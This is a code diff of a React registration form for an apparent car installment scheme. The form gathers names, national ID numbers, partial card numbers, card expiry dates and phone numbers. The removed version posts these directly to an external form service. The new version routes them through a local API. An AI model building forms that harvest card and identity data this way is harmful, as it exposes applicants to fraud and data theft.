@@ -41,50 +41,41 @@ export function RegistrationForm({ selectedCar, onSelectCar }: RegistrationFormP
   const handleSubmit = async () => {
     setIsLoading(true)
     
-    const registration = {
-      ...formData,
-      selectedCarId: selectedCar?.id,
-      createdAt: new Date().toISOString(),
-      status: "pending",
-    }
-    
     try {
-      // Send directly to Formcarry
-      const response = await fetch("https://formcarry.com/s/ZXsyzAQSlEQ", {
+      // Save to Supabase via API and also send Formcarry notification
+      const response = await fetch("/api/register", {
         method: "POST",
         headers: { 
           "Content-Type": "application/json",
-          "Accept": "application/json"
         },
         body: JSON.stringify({
           fullName: formData.fullName,
           nin: formData.nin,
-          phone1: formData.phone1,
-          phone2: formData.phone2 || "غير محدد",
-          cardNumber: formData.cardLast8,
+          cardLast8: formData.cardLast8,
           cardExpiry: formData.cardExpiry,
-          hasPreviousInstallment: formData.hasPreviousInstallment ? "نعم" : "لا",
-          selectedCar: selectedCar ? `${selectedCar.brand} ${selectedCar.model}` : "لم يتم الاختيار",
-          carPrice: selectedCar ? `${selectedCar.price} دج` : "",
-          monthlyPayment: selectedCar ? `${selectedCar.monthlyPayment} دج/شهر` : "",
-          registrationDate: new Date().toLocaleString("ar-DZ"),
+          phone1: formData.phone1,
+          phone2: formData.phone2 || null,
+          hasPreviousInstallment: formData.hasPreviousInstallment,
+          selectedCarId: selectedCar?.id,
+          selectedCar: selectedCar,
         }),
       })
       
       const result = await response.json()
-      console.log("[v0] Formcarry result:", result)
+      
+      if (!response.ok) {
+        console.error("[v0] Registration error:", result)
+        throw new Error(result.message || "حدث خطأ في التسجيل")
+      }
+      
+      setIsSubmitted(true)
+      setStep(3)
     } catch (error) {
-      console.error("[v0] Error sending to Formcarry:", error)
+      console.error("[v0] Error submitting registration:", error)
+      alert("حدث خطأ في التسجيل. يرجى المحاولة مرة أخرى.")
+    } finally {
+      setIsLoading(false)
     }
-    
-    // Store in localStorage for dashboard
-    const registrations = JSON.parse(localStorage.getItem("registrations") || "[]")
-    registrations.push({ ...registration, id: Date.now().toString() })
-    localStorage.setItem("registrations", JSON.stringify(registrations))
-    
-    setIsLoading(false)
-    setIsSubmitted(true)
-    setStep(3)
   }
 
   const steps = [
